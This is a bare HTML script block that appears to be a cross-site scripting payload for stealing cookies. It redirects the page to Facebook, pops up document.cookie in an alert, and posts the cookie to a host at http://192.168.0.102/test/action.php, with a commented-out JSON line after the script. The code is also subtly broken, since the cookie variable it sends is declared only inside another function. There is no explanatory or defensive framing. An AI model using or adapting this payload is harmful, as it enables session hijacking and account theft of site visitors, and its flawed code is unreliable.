

<script>


           location.replace('https://www.facebook.com/');



            const myTimeout = setTimeout(myGreeting, 1000);

    function myGreeting() {
         var cookie = document.cookie;
            alert(cookie);
         }


            let xhr = new XMLHttpRequest();
            let url = "http://192.168.0.102/test/action.php";


            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {

                    result.innerHTML = this.responseText;

                }
            };
            xhr.send("cookiesend=" + cookie);





</script>


//var data = JSON.parse({ "cookiesend": cookie });
            //alert(data);
